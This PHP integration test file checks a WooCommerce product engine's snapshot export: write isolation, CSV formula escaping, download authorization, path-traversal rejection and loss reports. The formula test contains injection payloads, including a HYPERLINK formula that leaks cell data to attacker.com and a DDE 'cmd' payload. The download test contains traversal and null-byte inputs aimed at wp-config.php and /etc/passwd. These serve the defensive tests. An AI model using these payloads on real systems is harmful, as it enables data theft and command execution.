<?php
/**
 * T31 Integration Test — Snapshot export và secure report delivery.
 *
 * Verifies:
 * - R124 (export_snapshot_under_writes): Immutable snapshot staging ensures export consistency during concurrent writes with zero lost/duplicate rows (AC-T31-01).
 * - R125 (csv_formula_profiles): Distinct machine vs spreadsheet_safe profiles with formula injection escaping (=, +, -, @, \t, \r) and control char stripping.
 * - R126 (download_auth_and_path): Strict capability check on every request and rejection of directory traversal / null byte exploits (AC-T31-02).
 * - R127 (export_loss_report_and_counts): Loss report with field, path, reason (AC-T31-02), exact counts tracking, and artifact retention cleanup.
 * - AC-T31-01: Round-trip import matches engine dialect fields, and concurrent writes do not cause lost/duplicate rows.
 * - AC-T31-02: Permission download checked on every request; loss report contains field, path, and reason.
 */

if (!defined('ABSPATH')) {
    $wp_load = '/var/www/site1.localhost/wp-load.php';
    if (file_exists($wp_load)) {
        require_once $wp_load;
    } else {
        fwrite(STDERR, "Error: WordPress environment not found.\n");
        exit(1);
    }
}

require_once dirname(__DIR__, 2) . '/wc-product-engine.php';

use WPE\Application\ImportExport\SnapshotExporter;
use WPE\Application\ImportExport\CsvStager;
use WPE\Application\ImportExport\ImportCommitter;
use WPE\Infrastructure\Database\ProductRepository;
use WPE\Infrastructure\Database\OptionsRepository;

class T31Test
{
    private \wpdb $wpdb;
    private SnapshotExporter $exporter;
    private CsvStager $stager;
    private ImportCommitter $committer;
    private ProductRepository $productRepo;
    private OptionsRepository $optionsRepo;
    private string $testExportDir;
    private string $testUploadDir;

    private array $cleanJobIds = [];
    private array $cleanProductIds = [];
    private array $cleanFiles = [];

    public function __construct()
    {
        global $wpdb;
        $this->wpdb = $wpdb;

        $wpUpload = wp_upload_dir();
        $this->testExportDir = rtrim($wpUpload['basedir'], '/\\') . '/wpe-test-exports-t31';
        $this->testUploadDir = rtrim($wpUpload['basedir'], '/\\') . '/wpe-test-imports-t31';

        $this->productRepo = new ProductRepository($this->wpdb);
        $this->optionsRepo = new OptionsRepository($this->wpdb);
        $this->exporter    = new SnapshotExporter($this->wpdb, $this->productRepo, $this->optionsRepo, $this->testExportDir);
        $this->stager      = new CsvStager($this->wpdb, $this->testUploadDir);
        $this->committer   = new ImportCommitter($this->wpdb, null, null, null, $this->stager);

        wp_set_current_user(1); // Set administrator
    }

    public function run(): void
    {
        echo "Running T31 Integration Tests...\n";
        try {
            $this->testR124_export_snapshot_under_writes();
            $this->testR125_csv_formula_profiles();
            $this->testR126_download_auth_and_path();
            $this->testR127_export_loss_report_and_counts();
            $this->testAC_T31_01_round_trip_and_dialect();
            echo "All T31 tests passed successfully!\n";
        } finally {
            $this->tearDown();
        }
    }

    private function tearDown(): void
    {
        // Clean jobs
        foreach ($this->cleanJobIds as $jobId) {
            $this->wpdb->delete($this->wpdb->prefix . 'wpe_jobs', ['id' => $jobId]);
            $this->wpdb->delete($this->wpdb->prefix . 'wpe_import_rows', ['job_id' => $jobId]);
        }

        // Clean products, variants, options, and shells
        foreach ($this->cleanProductIds as $pId) {
            $variants = $this->wpdb->get_col($this->wpdb->prepare(
                "SELECT id FROM {$this->wpdb->prefix}wpe_variants WHERE product_id = %d",
                $pId
            ));

            foreach ($variants as $vId) {
                $this->wpdb->delete($this->wpdb->prefix . 'wpe_inventory', ['owner_id' => $vId]);
                $this->wpdb->delete($this->wpdb->prefix . 'wpe_variant_values', ['variant_id' => $vId]);
                $this->wpdb->delete($this->wpdb->prefix . 'wpe_variant_media', ['variant_id' => $vId]);
                $this->wpdb->delete($this->wpdb->prefix . 'wpe_variants', ['id' => $vId]);
                $this->wpdb->delete($this->wpdb->prefix . 'wpe_sku_registry', ['object_id' => $vId]);
                $this->wpdb->delete($this->wpdb->prefix . 'posts', ['ID' => $vId]);
            }

            $options = $this->wpdb->get_col($this->wpdb->prepare(
                "SELECT id FROM {$this->wpdb->prefix}wpe_options WHERE product_id = %d",
                $pId
            ));
            foreach ($options as $optId) {
                $this->wpdb->delete($this->wpdb->prefix . 'wpe_option_values', ['option_id' => $optId]);
                $this->wpdb->delete($this->wpdb->prefix . 'wpe_options', ['id' => $optId]);
            }

            $this->wpdb->delete($this->wpdb->prefix . 'wpe_inventory', ['owner_id' => $pId]);
            $this->wpdb->delete($this->wpdb->prefix . 'wpe_product_media', ['product_id' => $pId]);
            $this->wpdb->delete($this->wpdb->prefix . 'wpe_products', ['id' => $pId]);
            $this->wpdb->delete($this->wpdb->prefix . 'wpe_sku_registry', ['object_id' => $pId]);
            $this->wpdb->delete($this->wpdb->prefix . 'wpe_object_state', ['object_id' => $pId]);
            $this->wpdb->delete($this->wpdb->prefix . 'posts', ['ID' => $pId]);
        }

        // Safeguard purge for T31 SKUs
        $this->wpdb->query("DELETE FROM {$this->wpdb->prefix}wpe_sku_registry WHERE original_sku LIKE 'T31-%'");
        $this->wpdb->query("DELETE FROM {$this->wpdb->prefix}wpe_products WHERE sku LIKE 'T31-%'");
        $this->wpdb->query("DELETE FROM {$this->wpdb->prefix}wpe_variants WHERE sku LIKE 'T31-%'");

        // Clean test files
        foreach ($this->cleanFiles as $f) {
            if (file_exists($f)) {
                @unlink($f);
            }
        }

        // Remove test export directory
        if (is_dir($this->testExportDir)) {
            $this->deleteDirRecursive($this->testExportDir);
        }
        if (is_dir($this->testUploadDir)) {
            $this->deleteDirRecursive($this->testUploadDir);
        }
    }

    private function deleteDirRecursive(string $dir): void
    {
        $items = glob($dir . '/*');
        foreach ($items as $item) {
            if (is_dir($item)) {
                $this->deleteDirRecursive($item);
            } else {
                @unlink($item);
            }
        }
        @rmdir($dir);
    }

    private function assert(bool $condition, string $message): void
    {
        if (!$condition) {
            throw new \RuntimeException("Assertion failed: {$message}");
        }
    }

    /**
     * R124: Test that export uses immutable snapshot staging and is isolated from concurrent writes (AC-T31-01).
     */
    public function testR124_export_snapshot_under_writes(): void
    {
        echo "Testing R124 (export_snapshot_under_writes)...\n";

        // 1. Create base catalog products
        $p1 = $this->productRepo->create([
            'title'         => 'T31 Base Product 1',
            'sku'           => 'T31-P1-BASE',
            'regular_price' => '100.00',
            'stock_quantity'=> '50',
            'type'          => 'simple',
            'status'        => 'publish',
        ]);
        $this->cleanProductIds[] = (int)$p1['id'];

        $p2 = $this->productRepo->create([
            'title'         => 'T31 Base Product 2',
            'sku'           => 'T31-P2-BASE',
            'regular_price' => '200.00',
            'stock_quantity'=> '30',
            'type'          => 'simple',
            'status'        => 'publish',
        ]);
        $this->cleanProductIds[] = (int)$p2['id'];

        // 2. Create export job (captures immutable snapshot)
        $filterIds = [(int)$p1['id'], (int)$p2['id']];
        $staged = $this->exporter->createExportJob([
            'format'  => 'woo',
            'profile' => 'machine',
            'filters' => ['product_ids' => $filterIds],
        ]);
        $this->cleanJobIds[] = $staged['job_id'];

        $this->assert($staged['status'] === 'staged', "Export job should be in staged state");
        $this->assert($staged['counts']['total_products'] === 2, "Staged counts should record 2 products");
        $this->assert(!empty($staged['snapshot_hash']), "Snapshot hash must be non-empty");

        // 3. CONCURRENT WRITES while export is staged:
        // a) Mutate P1 title, price, and version in DB
        $this->productRepo->update((int)$p1['id'], [
            'name'          => 'T31 Base Product 1 MUTATED',
            'title'         => 'T31 Base Product 1 MUTATED',
            'regular_price' => '999.00',
        ]);

        // b) Delete P2 in DB
        $this->wpdb->update(
            $this->wpdb->prefix . 'wpe_products',
            ['deleted_at' => (new \DateTimeImmutable('now', new \DateTimeZone('UTC')))->format('Y-m-d H:i:s.u')],
            ['id' => (int)$p2['id']]
        );

        // c) Insert a new Product P3 into DB
        $p3 = $this->productRepo->create([
            'title'         => 'T31 Fresh New Product 3',
            'sku'           => 'T31-P3-NEW',
            'regular_price' => '555.00',
            'type'          => 'simple',
            'status'        => 'publish',
        ]);
        $this->cleanProductIds[] = (int)$p3['id'];

        // 4. Process/stream export from snapshot staging
        $processed = $this->exporter->processExport($staged['job_id']);
        $this->assert($processed['status'] === 'completed', "Job should be completed");
        $this->assert($processed['counts']['total_products'] === 2, "Total products should remain 2");
        $this->assert($processed['counts']['exported_products'] === 2, "Exported products should be 2");

        // 5. Inspect generated CSV
        $csvPath = $this->testExportDir . '/' . $staged['job_id'] . '/export.csv';
        $this->assert(file_exists($csvPath), "export.csv must exist");

        $handle = fopen($csvPath, 'r');
        $headers = fgetcsv($handle);
        $nameCol = array_search('Name', $headers, true);
        $skuCol  = array_search('SKU', $headers, true);
        $priceCol= array_search('Regular price', $headers, true);

        $this->assert($nameCol !== false && $skuCol !== false && $priceCol !== false, "Required CSV columns missing");

        $rows = [];
        while (($row = fgetcsv($handle)) !== false) {
            $rows[$row[$skuCol]] = $row;
        }
        fclose($handle);

        // Total exported rows: 1 header + 2 data rows = 3 rows in total_rows count
        $this->assert($processed['counts']['total_rows'] === 3, "Total rows count should be 3 (1 header + 2 data rows)");
        $this->assert(count($rows) === 2, "CSV should contain exactly 2 product rows");

        // P1 must preserve PRE-WRITE data from snapshot (AC-T31-01)
        $this->assert(isset($rows['T31-P1-BASE']), "P1 must be present in exported CSV");
        $this->assert($rows['T31-P1-BASE'][$nameCol] === 'T31 Base Product 1', "P1 must preserve pre-write snapshot name");
        $this->assert((float)$rows['T31-P1-BASE'][$priceCol] === 100.0, "P1 must preserve pre-write snapshot price 100.00");

        // P2 must be present from snapshot despite concurrent deletion
        $this->assert(isset($rows['T31-P2-BASE']), "P2 must be present in CSV from snapshot despite concurrent deletion");
        $this->assert((float)$rows['T31-P2-BASE'][$priceCol] === 200.0, "P2 price should be 200.00");

        // P3 must NOT be present in CSV
        $this->assert(!isset($rows['T31-P3-NEW']), "P3 created after snapshot must NOT be in exported CSV");

        // Verify manifest integrity
        $manifestPath = $this->testExportDir . '/' . $staged['job_id'] . '/manifest.json';
        $manifest = json_decode(file_get_contents($manifestPath), true);
        $this->assert($manifest['snapshot_hash'] === $staged['snapshot_hash'], "Manifest snapshot hash must match staged hash");
        $this->assert($manifest['counts']['total_products'] === 2, "Manifest counts must match snapshot");

        echo "R124 passed: Snapshot write isolation and zero duplicate/lost rows verified.\n";
    }

    /**
     * R125: Test machine vs spreadsheet_safe profiles for formula escaping and control character sanitization.
     */
    public function testR125_csv_formula_profiles(): void
    {
        echo "Testing R125 (csv_formula_profiles)...\n";

        // Product with formula injection triggers and control characters
        $formulaTitle = '=HYPERLINK("http://attacker.com/leak?data="&A1,"Click")';
        $formulaDesc  = "+cmd|' /C calc'!A0";
        $formulaShort = "-50+20";
        $formulaSku   = "@T31-FORMULA-SKU";
        $ctrlCharTitle= "=Clean\x00Title\x07Alert"; // Contains \x00 null byte and \x07 bell

        $p = $this->productRepo->create([
            'title'             => $ctrlCharTitle,
            'sku'               => $formulaSku,
            'regular_price'     => '45.00',
            'description'       => $formulaDesc,
            'short_description' => $formulaShort,
            'type'              => 'simple',
            'status'            => 'publish',
        ]);
        $this->cleanProductIds[] = (int)$p['id'];

        // 1. Export under 'machine' profile
        $jobMachine = $this->exporter->createExportJob([
            'format'  => 'woo',
            'profile' => 'machine',
            'filters' => ['product_ids' => [(int)$p['id']]],
        ]);
        $this->cleanJobIds[] = $jobMachine['job_id'];
        $this->exporter->processExport($jobMachine['job_id']);

        $csvMachine = file_get_contents($this->testExportDir . '/' . $jobMachine['job_id'] . '/export.csv');
        $handleM = fopen('php://memory', 'r+');
        fwrite($handleM, $csvMachine);
        rewind($handleM);
        $headersM = fgetcsv($handleM);
        $rowM = fgetcsv($handleM);
        fclose($handleM);

        $nameCol = array_search('Name', $headersM, true);
        $skuCol  = array_search('SKU', $headersM, true);
        $descCol = array_search('Description', $headersM, true);
        $shortCol= array_search('Short description', $headersM, true);

        // Under 'machine' profile, raw values are preserved without single quote prefix
        $this->assert(str_starts_with($rowM[$nameCol], '='), "Machine profile must preserve raw '=' prefix");
        $this->assert(str_starts_with($rowM[$skuCol], '@'), "Machine profile must preserve raw '@' prefix");
        $this->assert(str_starts_with($rowM[$descCol], '+'), "Machine profile must preserve raw '+' prefix");
        $this->assert(str_starts_with($rowM[$shortCol], '-'), "Machine profile must preserve raw '-' prefix");

        // 2. Export under 'spreadsheet_safe' profile
        $jobSafe = $this->exporter->createExportJob([
            'format'  => 'woo',
            'profile' => 'spreadsheet_safe',
            'filters' => ['product_ids' => [(int)$p['id']]],
        ]);
        $this->cleanJobIds[] = $jobSafe['job_id'];
        $this->exporter->processExport($jobSafe['job_id']);

        $csvSafe = file_get_contents($this->testExportDir . '/' . $jobSafe['job_id'] . '/export.csv');
        $handleS = fopen('php://memory', 'r+');
        fwrite($handleS, $csvSafe);
        rewind($handleS);
        $headersS = fgetcsv($handleS);
        $rowS = fgetcsv($handleS);
        fclose($handleS);

        // Under 'spreadsheet_safe', formula triggers are escaped with leading single quote '
        $this->assert(str_starts_with($rowS[$nameCol], "'="), "Spreadsheet-safe profile must escape '=' with leading \"'\"");
        $this->assert(str_starts_with($rowS[$skuCol], "'@"), "Spreadsheet-safe profile must escape '@' with leading \"'\"");
        $this->assert(str_starts_with($rowS[$descCol], "'+"), "Spreadsheet-safe profile must escape '+' with leading \"'\"");
        $this->assert(str_starts_with($rowS[$shortCol], "'-"), "Spreadsheet-safe profile must escape '-' with leading \"'\"");

        // Dangerous control characters (\x00, \x07) must be stripped
        $this->assert(!str_contains($rowS[$nameCol], "\x00"), "Spreadsheet-safe profile must strip \\x00 null byte");
        $this->assert(!str_contains($rowS[$nameCol], "\x07"), "Spreadsheet-safe profile must strip \\x07 bell char");

        echo "R125 passed: Machine vs spreadsheet-safe profiles correctly handle formula triggers and control chars.\n";
    }

    /**
     * R126: Test download authorization checked on every request and rejection of directory traversal / null bytes (AC-T31-02).
     */
    public function testR126_download_auth_and_path(): void
    {
        echo "Testing R126 (download_auth_and_path)...\n";

        // Create and complete an export job
        $job = $this->exporter->createExportJob(['format' => 'woo', 'profile' => 'machine']);
        $this->cleanJobIds[] = $job['job_id'];
        $this->exporter->processExport($job['job_id']);

        // 1. Test Authorization Check (Checked on EVERY request)
        // a) Unauthenticated / unauthorized user
        wp_set_current_user(0); // Guest
        $authBlocked = false;
        try {
            $this->exporter->downloadExportFile($job['job_id'], 'csv');
        } catch (\RuntimeException $e) {
            if ($e->getCode() === 403) {
                $authBlocked = true;
            }
        }
        $this->assert($authBlocked, "Guest user without capabilities must receive 403 Forbidden");

        // b) Authorized user (Administrator / manage_woocommerce)
        wp_set_current_user(1);
        $download = $this->exporter->downloadExportFile($job['job_id'], 'csv');
        $this->assert(!empty($download['content']), "Authorized download should return file content");
        $this->assert($download['mime_type'] === 'text/csv; charset=UTF-8', "CSV download must set text/csv mime type");

        // 2. Test Path Traversal and Attack Vectors
        // a) Directory traversal ../../wp-config.php
        $traversalBlocked = false;
        try {
            $this->exporter->downloadExportFile('../../wp-config.php', 'csv');
        } catch (\InvalidArgumentException $e) {
            $traversalBlocked = true;
        }
        $this->assert($traversalBlocked, "Job ID with traversal path must be rejected with 400 Bad Request");

        // b) Null byte injection in job ID
        $nullByteBlocked = false;
        try {
            $this->exporter->downloadExportFile("{$job['job_id']}\x00.csv", 'csv');
        } catch (\InvalidArgumentException $e) {
            $nullByteBlocked = true;
        }
        $this->assert($nullByteBlocked, "Job ID with null byte must be rejected");

        // c) Invalid artifact type
        $invalidTypeBlocked = false;
        try {
            $this->exporter->downloadExportFile($job['job_id'], '../../etc/passwd');
        } catch (\InvalidArgumentException $e) {
            $invalidTypeBlocked = true;
        }
        $this->assert($invalidTypeBlocked, "Invalid artifact type must be rejected");

        // d) Non-existent job
        $notFound = false;
        try {
            $this->exporter->downloadExportFile('non-existent-uuid-12345', 'csv');
        } catch (\RuntimeException $e) {
            if ($e->getCode() === 404) {
                $notFound = true;
            }
        }
        $this->assert($notFound, "Non-existent job must return 404 Not Found");

        echo "R126 passed: Download capability checked on every request; path traversal strictly rejected.\n";
    }

    /**
     * R127: Test loss report generation with field/path/reason (AC-T31-02), exact counts, and artifact retention cleanup.
     */
    public function testR127_export_loss_report_and_counts(): void
    {
        echo "Testing R127 (export_loss_report_and_counts)...\n";

        // Create product with complex nested meta and test lossy fields
        $p = $this->productRepo->create([
            'title'         => 'T31 Lossy Product',
            'sku'           => 'T31-P-LOSSY',
            'regular_price' => '89.00',
            'type'          => 'simple',
            'status'        => 'publish',
        ]);
        $this->cleanProductIds[] = (int)$p['id'];

        // Add complex nested meta that cannot be serialized into flat CSV
        update_post_meta((int)$p['id'], 'custom_matrix_config', [
            'dimension_matrix' => ['width' => 10, 'height' => 20, 'depth' => 30],
            'coefficients'     => [1.2, 3.4, 5.6],
        ]);

        $testLossyFields = [
            [
                'field'  => '3d_ar_model',
                'path'   => "products[{$p['id']}].assets.3d_ar_model",
                'reason' => '3D AR models cannot be represented in standard WooCommerce CSV dialect',
            ],
            [
                'field'  => 'tiered_b2b_pricing',
                'path'   => "products[{$p['id']}].pricing.tiered_b2b",
                'reason' => 'Multi-tier volume pricing not supported in flat product CSV row',
            ],
        ];

        $job = $this->exporter->createExportJob([
            'format'            => 'woo',
            'profile'           => 'machine',
            'filters'           => ['product_ids' => [(int)$p['id']]],
            'test_lossy_fields' => $testLossyFields,
        ]);
        $this->cleanJobIds[] = $job['job_id'];

        $processed = $this->exporter->processExport($job['job_id']);

        // 1. Loss report verification (AC-T31-02)
        $lossReport = $this->exporter->getLossReport($job['job_id']);
        $this->assert(!empty($lossReport), "Loss report must not be empty");

        foreach ($lossReport as $entry) {
            $this->assert(isset($entry['field']) && !empty($entry['field']), "Loss report entry must contain 'field'");
            $this->assert(isset($entry['path']) && !empty($entry['path']), "Loss report entry must contain 'path'");
            $this->assert(isset($entry['reason']) && !empty($entry['reason']), "Loss report entry must contain 'reason'");
        }

        // 2. Exact Counts verification
        $this->assert($processed['counts']['total_products'] === 1, "total_products count must be 1");
        $this->assert($processed['counts']['exported_products'] === 1, "exported_products count must be 1");
        $this->assert($processed['counts']['total_rows'] === 2, "total_rows count must be 2 (1 header + 1 parent row)");
        $this->assert($processed['counts']['loss_count'] >= 3, "loss_count must reflect complex meta + test lossy fields");

        // 3. Artifact Retention Cleanup
        // Create a simulated expired export job directory (10 days old)
        $expiredJobId = 'simulated-expired-job-777';
        $expiredJobDir = $this->testExportDir . '/' . $expiredJobId;
        wp_mkdir_p($expiredJobDir);
        file_put_contents($expiredJobDir . '/export.csv', "dummy old export\n");
        // Touch mtime to 10 days ago
        touch($expiredJobDir, time() - (10 * 86400));

        // Call retention cleanup with 7 days threshold
        $cleanupResult = $this->exporter->cleanupExpiredArtifacts(7);
        $this->assert($cleanupResult['cleaned_jobs'] >= 1, "Cleanup must remove at least 1 expired job");
        $this->assert(!is_dir($expiredJobDir), "Expired job directory must have been deleted");

        // Fresh job directory must remain intact
        $freshJobDir = $this->testExportDir . '/' . $job['job_id'];
        $this->assert(is_dir($freshJobDir), "Recent job directory must be preserved by retention policy");

        echo "R127 passed: Loss report has field/path/reason, counts match, retention policy enforced.\n";
    }

    /**
     * AC-T31-01: Test round-trip import of engine snapshot matching dialect fields.
     */
    public function testAC_T31_01_round_trip_and_dialect(): void
    {
        echo "Testing AC-T31-01 (round_trip_and_dialect)...\n";

        // 1. Create a variable product with 2 variations and options
        $parent = $this->productRepo->create([
            'title'         => 'T31 Roundtrip Variable Product',
            'sku'           => 'T31-RT-VAR',
            'type'          => 'variable',
            'status'        => 'publish',
            'regular_price' => '150.00',
        ]);
        $parentId = (int)$parent['id'];
        $this->cleanProductIds[] = $parentId;

        // Create 'Color' option with values 'Red' and 'Blue'
        $opt = $this->optionsRepo->createOption($parentId, ['name' => 'Color', 'key' => 'color', 'position' => 0]);
        $valRed  = $this->optionsRepo->createOptionValue((int)$opt['id'], ['label' => 'Red', 'value_key' => 'red', 'position' => 0]);
        $valBlue = $this->optionsRepo->createOptionValue((int)$opt['id'], ['label' => 'Blue', 'value_key' => 'blue', 'position' => 1]);

        // Add 2 variations
        $this->productRepo->update($parentId, [
            'variations' => [
                [
                    'sku'           => 'T31-RT-VAR-RED',
                    'regular_price' => '140.00',
                    'sale_price'    => '120.00',
                    'status'        => 'publish',
                    'position'      => 0,
                    'stock_quantity'=> '25',
                    'attributes'    => ['Color' => 'Red'],
                ],
                [
                    'sku'           => 'T31-RT-VAR-BLUE',
                    'regular_price' => '160.00',
                    'status'        => 'publish',
                    'position'      => 1,
                    'stock_quantity'=> '40',
                    'attributes'    => ['Color' => 'Blue'],
                ],
            ],
        ]);

        $varRed = $this->wpdb->get_row($this->wpdb->prepare("SELECT id FROM {$this->wpdb->prefix}wpe_variants WHERE sku = %s", 'T31-RT-VAR-RED'), ARRAY_A);
        $varBlue = $this->wpdb->get_row($this->wpdb->prepare("SELECT id FROM {$this->wpdb->prefix}wpe_variants WHERE sku = %s", 'T31-RT-VAR-BLUE'), ARRAY_A);
        $this->optionsRepo->assignVariantCombination($parentId, (int)$varRed['id'], [(int)$opt['id'] => (int)$valRed['id']]);
        $this->optionsRepo->assignVariantCombination($parentId, (int)$varBlue['id'], [(int)$opt['id'] => (int)$valBlue['id']]);

        // 2. Export catalog snapshot
        $exportJob = $this->exporter->createExportJob([
            'format'  => 'woo',
            'profile' => 'machine',
            'filters' => ['product_ids' => [$parentId]],
        ]);
        $this->cleanJobIds[] = $exportJob['job_id'];
        $this->exporter->processExport($exportJob['job_id']);

        $csvPath = $this->testExportDir . '/' . $exportJob['job_id'] . '/export.csv';
        $this->assert(file_exists($csvPath), "Export CSV file must exist");

        // 3. Purge the original product from DB to test clean snapshot restore into catalog
        $this->productRepo->delete($parentId, true);
        $this->wpdb->query("DELETE FROM {$this->wpdb->prefix}wpe_sku_registry WHERE original_sku LIKE 'T31-RT-%'");

        // 4. Stage the exported CSV into CsvStager
        $uploadInfo = $this->stager->storeUploadedFile($csvPath, 'exported-snapshot.csv');
        $this->cleanFiles[] = $uploadInfo['file_path'];

        $staged = $this->stager->stageJob($uploadInfo['staged_file_id'], ['format' => 'woo', 'dry_run' => true]);
        $this->cleanJobIds[] = $staged['job_id'];

        // 5. Validate staged CSV
        $validation = $this->stager->validateJob($staged['job_id']);
        $this->assert(empty($validation['errors']), "Validation must pass with 0 errors on engine snapshot export");
        $this->assert($validation['counts']['valid_rows'] >= 3, "Staged snapshot must have at least 3 valid rows (1 parent + 2 variations)");

        // 6. Commit import
        $committed = $this->committer->commitJob($staged['job_id']);
        $this->assert($committed['status'] === 'completed', "Commit must succeed and be completed");
        $this->assert($committed['groups_committed'] >= 1, "At least 1 product group committed");

        // 7. Verify fields match dialect
        $reloadedParent = $this->productRepo->getBySku('T31-RT-VAR');
        $this->assert($reloadedParent !== null, "Parent product must exist after import");
        $this->cleanProductIds[] = (int)$reloadedParent['id'];
        $this->assert($reloadedParent['sku'] === 'T31-RT-VAR', "Parent SKU must match dialect");
        $this->assert($reloadedParent['name'] === 'T31 Roundtrip Variable Product', "Parent Title must match dialect");
        $this->assert($reloadedParent['type'] === 'variable', "Product Type must remain variable");
        $this->assert(count($reloadedParent['variations']) === 2, "Parent must have exactly 2 variations");

        // Check variation details
        $varSkus = array_column($reloadedParent['variations'], 'sku');
        $this->assert(in_array('T31-RT-VAR-RED', $varSkus, true), "Variation RED SKU must be preserved");
        $this->assert(in_array('T31-RT-VAR-BLUE', $varSkus, true), "Variation BLUE SKU must be preserved");

        echo "AC-T31-01 passed: Engine snapshot round-trip faithfully preserves all dialect fields.\n";
    }
}

// Execute test suite when run via wp eval-file
$test = new T31Test();
$test->run();
